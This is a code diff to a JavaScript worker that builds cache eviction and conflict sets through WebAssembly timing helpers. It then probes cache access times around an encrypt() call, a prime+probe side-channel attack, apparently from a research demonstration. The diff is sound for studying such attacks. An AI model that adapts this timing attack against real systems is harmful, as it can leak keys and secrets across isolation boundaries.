@@ -8,7 +8,7 @@ function encrypt() {
 let memDataView = null;
 
 function getTime() {
-    return memDataView.getBigUint64(0, true);
+    return memDataView.getBigUint64(256, true);
 }
 
 function wait(n) {
@@ -23,11 +23,12 @@ class EvictionSetGenerator {
         this.dataView = dataView;
     }
     measureTimedMiss(timed_miss, probe, evsetPtr) {
-        const t = Number(getTime());
+        let t = BigInt(0);
         for (let i = 0; i < this.config.num_measurements; i++) {
-            timed_miss(evsetPtr, probe);
+            const a = timed_miss(probe, evsetPtr);
+            t += a;
         }
-        return (Number(getTime()) - t) / this.config.num_measurements;
+        return t / BigInt(this.config.num_measurements);
     }
     setupLinkedList(indices) {
         if (indices.length == 0) {
@@ -41,8 +42,14 @@ class EvictionSetGenerator {
         this.dataView.setUint32(pre, 0, true);
         return indices[0];
     };
+    getPageOffset(target) {
+        target = target & ((this.config.page_size - 1) >>> 0);
+        // to avoid unaligned memory access
+        target = target & ((~(4-1)) >>> 0)
+        return target ? target : 0;
+    }
     generateCandidateSet(target, timed_miss) {
-        const pageOffset = target & ((~(this.config.page_size - 1)) >>> 0);
+        const pageOffset = this.getPageOffset(target);
         let evicted = false;
         let indices = [];
         do {
@@ -58,6 +65,9 @@ class EvictionSetGenerator {
             if (target) {
                 let t = this.measureTimedMiss(timed_miss, target, indices[0]);
                 evicted = this.config.threshold < t;
+                if(!evicted) {
+                    console.log(".")
+                }
             }
         } while (target && !evicted);
         for (let i = 0; i < indices.length; i++) indices[i] -= pageOffset;
@@ -85,7 +95,7 @@ class EvictionSetGenerator {
         return [evset, removedChunks]
     }
     reduceToEvictionSet(timed_miss, candidates, probe) {
-        const pageOffset = probe & ((~(this.config.page_size - 1)) >>> 0);
+        const pageOffset = this.getPageOffset(probe);
         let evset = Array.from(candidates);
         for(let i = 0; i < evset.length; i++) evset[i] += pageOffset;
         let removedChunks = [];
@@ -155,21 +165,22 @@ self.onmessage = async (event) => {
         },
     });
     memDataView = new DataView(memory.buffer);
+    const timed_miss = wasmUtils.exports.timed_miss;
+    const timed_access = wasmUtils.exports.timed_access;
+    const evict = wasmUtils.exports.evict;
 
     const evGenerator = new EvictionSetGenerator(memDataView, config);
     console.log("evGenerator created")
-    const candidates = evGenerator.generateCandidateSet(config.probe[0], wasmUtils.exports.timed_miss);
+    const candidates = evGenerator.generateCandidateSet(config.probe[0], timed_miss);
     console.log("candidate set created with size: ", candidates.length);
 
     const evsets = new Array(config.probe.length);
     for(let i = 0; i < evsets.length; i++) {
         do {
-            evsets[i] = evGenerator.reduceToEvictionSet(wasmUtils.exports.timed_miss, candidates, config.probe[i])
+            evsets[i] = evGenerator.reduceToEvictionSet(timed_miss, candidates, config.probe[i])
         } while(evsets[i].length > 12);
         console.log("evset[", i, "] created with size: ", evsets[i].length);
     }
-    console.log(candidates);
-    console.log(evsets);
     const conflictSet = evGenerator.generateConflictSet(evsets);
     console.log(conflictSet)
     console.log("conflict set created with size: ", conflictSet.length);
@@ -178,14 +189,14 @@ self.onmessage = async (event) => {
     encrypt();
 
     for(let i = 0; i < total_num_results; i += config.probe.length) {
-        const startTime = getTime()
+        const startTime = wasmUtils.exports.get_time()
         for(let j = 0; j < config.probe.length; j++) {
-            results[i + j] = Number(wasmUtils.exports.timed_access(config.probe[j]));
+            results[i + j] = Number(timed_access(config.probe[j]));
         }
-        wasmUtils.exports.evict(conflictSet[0]);
+        evict(conflictSet[0]);
         do {
             wait(config.wait_cycles);
-        } while (getTime() - startTime < config.time_slot_size);
+        } while (wasmUtils.exports.get_time() - startTime < BigInt(config.time_slot_size));
     }
     self.postMessage(results);
 };
